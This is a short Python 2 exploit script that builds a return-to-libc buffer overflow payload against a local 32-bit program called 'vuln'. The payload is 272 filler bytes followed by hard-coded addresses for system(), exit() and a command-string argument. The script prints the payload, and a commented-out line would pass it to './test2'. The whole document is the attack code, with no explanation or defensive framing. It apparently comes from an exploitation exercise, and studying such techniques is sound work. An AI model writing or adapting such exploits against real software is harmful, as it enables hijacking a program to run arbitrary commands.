#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

system = 0x8048360
exit = 0x8048370
system_arg = 0xf7f489ab     #Obtained from hexdump output of executable 'vuln'

#endianess convertion
def conv(num):
	return struct.pack("<I",num)  #system + exit + system_arg
buf = "A" * 272
buf += conv(system)
buf += conv(exit)
buf += conv(system_arg)

print buf
#print "Calling vulnerable program"
#call(["./test2", buf])